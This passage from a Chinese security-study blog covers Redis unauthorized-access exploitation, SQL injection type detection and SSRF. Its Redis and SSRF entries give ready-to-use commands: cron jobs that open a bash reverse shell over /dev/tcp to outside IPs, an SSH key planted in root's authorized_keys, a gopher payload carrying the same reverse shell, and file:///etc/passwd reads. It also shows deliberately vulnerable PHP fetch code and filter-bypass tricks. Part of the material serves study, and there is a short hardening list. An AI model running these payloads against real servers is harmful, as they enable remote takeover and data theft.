<h2 id="Redis-写入计划任务"><a href="#Redis-写入计划任务" class="headerlink" title="Redis 写入计划任务"></a>Redis 写入计划任务</h2><p>在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p>
<p>命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.112.188 -p 6379</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.112.188/7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>之后再监听7777端口，即可反弹shell</p>
<ul>
<li><strong>注意</strong><br>这个方法只能Centos上使用，Ubuntu上行不通，原因如下：</li>
</ul>
<p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件 <code>/var/spool/cron/crontabs/</code>权限必须是600也就是 <code>-rw-------</code> 才会执行，否则会报错 <code>(root) INSECURE MODE (mode 0600 expected)</code> ，而Centos的定时任务文件 <code>/var/spool/cron/</code> 权限644也能执行<br>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错<br>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在 <code>/var/spool/cron/</code><br>Ubuntu定时任务文件在 <code>/var/spool/cron/crontabs/</code></p>
<h2 id="写ssh-keygen公钥然后使用私钥登录"><a href="#写ssh-keygen公钥然后使用私钥登录" class="headerlink" title="写ssh-keygen公钥然后使用私钥登录"></a>写ssh-keygen公钥然后使用私钥登录</h2><p>条件：服务端存在.ssh目录并且有写入的权限。<br>原理：在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为 <code>/root/.ssh</code> 和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的 <code>/root/.ssh</code> 下生成一个授权的key。<br>攻击机命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 192.168.112.188 -x set xxx</span><br></pre></td></tr></table></figure>
<p>使用攻击机连接目标机器Redis，设置Redis的备份路径为&#x2F;root&#x2F;.ssh&#x2F;并保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上。<br>在受害机相应路径下传输公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.112.188 -p 6379</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>ssh连接目标机成功!</p>
<h1 id="Redis未授权访问防御方法"><a href="#Redis未授权访问防御方法" class="headerlink" title="Redis未授权访问防御方法"></a>Redis未授权访问防御方法</h1><p>可以配置redis.conf文件，在redis安装目录下</p>
<ul>
<li>默认只对本地开放bind 127.0.0.1</li>
<li>添加登陆密码：修改redis.conf文件，添加requirepass password</li>
<li>在需要对外开放的时候修改默认端口（端口不重复就行）port 2333</li>
<li>配合iptables限制开放</li>
<li>降权：以低权限运行 Redis 服务（重启redis才能生效）</li>
<li>禁止使用root权限启动redis服务</li>
</ul>
]]></content>
      <categories>
        <category>Redis未授权访问</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之字符型和数字型判断</title>
    <url>/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p>
<span id="more"></span>

<h1 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h1><p>假如数据库中的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1 时，两者为true即返回正常<br>当$id &#x3D; 1 and 1&#x3D;2 时，后者为false即返回错误</p>
</li>
<li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>单引号不匹配，因此返回错误<br>（说明：其它形式的符号也是类似情况）</p>
</li>
</ol>
<h1 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h1><p>假如数据库中的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1  或 $id &#x3D; 1 and 1&#x3D;2 时，<br>因为有引号包裹，因此均返回正常</p>
</li>
<li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>多余的单引号不匹配，因此返回错误</p>
</li>
</ol>
<p>字符型可以通过闭合多余的单引号，使用注释符#或--+或%23</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure>
<p>最后的引号被注释掉，实际运行效果是id&#x3D;’1’<br>因此返回正常</p>
<h1 id="字符型和数字型"><a href="#字符型和数字型" class="headerlink" title="字符型和数字型"></a>字符型和数字型</h1><p>通过以上分析，我们可以得出结论：</p>
<ul>
<li>当$id&#x3D;1 and 1&#x3D;2 时，<br>数字型返回错误，而字符型返回正常</li>
<li>当$id&#x3D;1’ 时，<br>二者均返回错误</li>
<li>当$id&#x3D;1’--+ 时，<br>数字型返回错误，而字符型返回正常</li>
</ul>
<p>注：or可以构造一个一直为true的语句，能返回正常。常用于万能密码</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_44798520/article/details/122453649">sql注入_字符型、数字型判断</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>字符型</tag>
        <tag>数字型</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务端请求伪造</title>
    <url>/2022/12/09/SSRF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF与CSRF有一些相似之处，也有很大区别。</p>
<span id="more"></span>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br><img src="/simg/ssrf_1.png" alt=" "><br><img src="/simg/ssrf_2.png" alt=" "></p>
<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
<h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>了解了漏洞的原理后，我们知道所有能发起请求的地方都可能会存在SSRF漏洞，我们可以根据“漏洞代码”中的常见方法对项目进行自查。以下列举一些最容易出现本漏洞的场景：</p>
<ol>
<li>能填写链接的地方</li>
</ol>
<ul>
<li>业务场景</li>
<li>从URL上传图片</li>
<li>订阅RSS</li>
<li>爬虫</li>
<li>预览</li>
<li>离线下载</li>
</ul>
<ol start="2">
<li>数据库内置功能</li>
</ol>
<ul>
<li>Oracle</li>
<li>MongoDB</li>
<li>MSSQL</li>
<li>Postgres</li>
<li>CouchDB</li>
</ul>
<ol start="3">
<li>邮箱服务器收取其他邮箱邮件</li>
</ol>
<ul>
<li>POP3&#x2F;IMAP&#x2F;SMTP</li>
</ul>
<ol start="4">
<li>文件处理、编码处理、属性处理</li>
</ol>
<ul>
<li>FFmpeg</li>
<li>ImageMagick</li>
<li>Docx</li>
<li>PDF</li>
<li>XML</li>
</ul>
<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。<br>主要分为两个方向，SSRF 利用相关的危险函数；SSRF 可利用的协议操作。</p>
<ul>
<li>访问正常文件<br>访问正常文件，例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li>
<li>端口扫描<br>当访问未开放端口，脚本会显示空白或报错。例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1:1234</span><br></pre></td></tr></table></figure>
当访问开放端口时，脚本会显示banner信息：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br></pre></td></tr></table></figure></li>
<li>读取系统本地文件<br>利用file协议可以任意读取系统本地文件，提交参数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file://c:windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure></li>
<li>内网web应用指纹识别<br>识别内网应用使用的框架，平台，模块以及cms可以为后续的渗透测试提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜索漏洞进行攻击。<br>比如可以通过访问下列文件来判断phpMyAdmin是否安装以及详细版本：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://localhost/phpmyadmin/README</span><br></pre></td></tr></table></figure></li>
<li>攻击内网应用<br>内网的安全通常都很薄弱，溢出、弱口令等一般都是存在的。通过ssrf攻击，可以实现对内网的访问，从而可以攻击内网应用或本地机器，获得shell，这里的应用包括服务、web应用等。<br>仅仅通过get方法可以攻击的web应用有很多，比如struts2命令执行等。<br>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line"></span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>file_get_contents这一函数是把传入的参数(变量)写入字符串，当把 传参是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述测试代码中，file_get_contents()函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似于ssrf.php?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd的payload即可读取服务器本地的任意文件。<br><img src="/simg/ssrf_3.png" alt=" "><br>readfile()函数与file_get_contents()函数相似。</p>
<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code><br>hostname: 如果安装了 OpenSSL，那么可以在主机名地址前面添加 ssl:&#x2F;&#x2F; 或者是 tls:&#x2F;&#x2F;，从而可以使用基于 TCP&#x2F;IP 协议的 SSL 或者 TLS 的客户端连接到远程主机。<br>port: 端口号。可以省略该参数或传 -1，则表示传输器不使用端口，例如 unix:&#x2F;&#x2F;。<br>errno: 如果errno的返回值为0，而且这个函数的返回值为FALSE，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。<br>errstr: 错误信息将以字符串的信息返回。<br>timeout: 设置连接的时限，单位为秒。fsockopen()的连接时限（timeout）的参数仅仅在套接字连接的时候生效。</p>
<p>用于打开一个网络连接或一个unix套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其它文件类函数调用（如：fgets(),fgetss(),fwrite(),fclose()还有feof()）。如果调用失败，将会返回false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br/&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">	<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_4.png" alt=" "></p>
<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。<br>curl_exec — 执行 cURL 会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl_exec(resource $ch): mixed</span><br></pre></td></tr></table></figure>
<p>执行给定的 cURL 会话。<br>这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。<br>成功时返回 true， 或者在失败时返回 false。 然而，如果 设置了 CURLOPT_RETURNTRANSFER 选项，函数执行成功时会返回执行的结果，失败时返回 false 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();  <span class="comment">// 创建新的cURL资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_URL, <span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_OPTRETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 抓取URL并把它传给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_content($filename, $result);</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$result</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_5.png" alt=" "></p>
<h1 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h1><p>SSRF漏洞的利用所涉及的协议有：</p>
<ul>
<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
<li>http&#x2F;s协议：探测内网主机存活</li>
</ul>
<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>payload的利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///etc/password # file:// 之后可以接任意文件</span><br></pre></td></tr></table></figure>
<p>这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/index.php?url=file:///etc/password</span><br></pre></td></tr></table></figure>

<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>探测一下内网活着的主机（但是很多不会开Http协议，没多大用）<br>抓一下包，在Burp里面探测一下就行</p>
<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://ip/info 可获取本地redis服务配置信息</span><br></pre></td></tr></table></figure>
<p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server</p>
<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。<br>gopher协议在各个编程语言中的限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php  	--write-curlwrappers且php版本至少为5.3</span><br><span class="line">—wite-curlwrappers选项含义：运用curl工具打开url流</span><br><span class="line">curl使用curl —version查看版本以及支持的协议</span><br><span class="line">Java	小于JDK1.7</span><br><span class="line">Curl 	低版本不支持</span><br><span class="line">Perl 	支持</span><br><span class="line">ASP.NET 小于版本3</span><br></pre></td></tr></table></figure>
<p>Curl的所需参数是一个URL，即URLEncode后的链接（重点）</p>
<ul>
<li>格式：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br><span class="line">如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码（详细注意事项见下）</span><br></pre></td></tr></table></figure>
gopher发送get请求</li>
<li>问号（?）需要转码为URL编码，也就是%3f</li>
<li>回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a</li>
<li>在HTTP包的最后要加上%0d%0a，代表消息结束（具体可研究HTTP包结束）<br>可直接转换的脚本：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import reimport urllib.parsedata=\    &#x27;&#x27;&#x27;GET /try.php?a=Wan&amp;b=Zifeng HTTP/1.1Host: 192.168.0.130:8201Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#x27;&#x27;&#x27;data=urllib.parse.quote(data)strinfo=re.compile(&#x27;%0A&#x27;,re.I)new=strinfo.sub(&#x27;%0D%0A&#x27;,data)new=&#x27;gopher://192.168.0.130:8201/_&#x27;+new+&#x27;%0D%0A&#x27;new=urllib.parse.quote(new)with open(&#x27;Result.txt&#x27;,&#x27;w&#x27;) as f:    f.write(new)with open(&#x27;Result.txt&#x27;,&#x27;r&#x27;) as f:    for line in f.readlines():        print(line.strip())</span><br></pre></td></tr></table></figure>
因为Burp是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码<br>这样到达服务器一次解码得到的就是<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A</span><br></pre></td></tr></table></figure>
这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事</li>
</ul>
<p>gopher发送post请求<br>和get请求一样，放入脚本编码后即可放入url中。<br>post请求：如果是Content-type为application&#x2F;x-www-form-urlencoded，那么POST数据也应进行二次编码（该选项含义就是URL编码后的数据）</p>
<p>使用注意事项</p>
<ul>
<li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
<li>file_get_contents 的 gopher 协议不能 URLencode</li>
<li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
<li>PHP 的 curl 默认不 follow 302 跳转</li>
<li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li>
</ul>
<p><a href="https://www.anquanke.com/post/id/262430#h3-5">gopher协议</a></p>
<h2 id="Redis未授权攻击"><a href="#Redis未授权攻击" class="headerlink" title="Redis未授权攻击"></a>Redis未授权攻击</h2><p>常用redis命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
<p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span><br></pre></td></tr></table></figure>
<p>经过url解码便是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure>



<h1 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p>URL的完整格式是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure>
<p>所以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=”http://baidu.com@1.1.1.1″”&gt;http://baidu.com@1.1.1.1</span><br><span class="line">和</span><br><span class="line">http://1.1.1.1</span><br><span class="line">效果相同，因为解析的本来就是@后面的服务器地址</span><br></pre></td></tr></table></figure>

<h2 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h2><p>以PHP为例，一般后端用正则匹配IP长这个样子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$str = &#x27;&#x27;;$isMatched = preg_match_all(&#x27;/((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;, $str, $matches);var_dump($isMatched, $matches);</span><br></pre></td></tr></table></figure>
<p>所以可以换成各种进制进行绕过:</p>
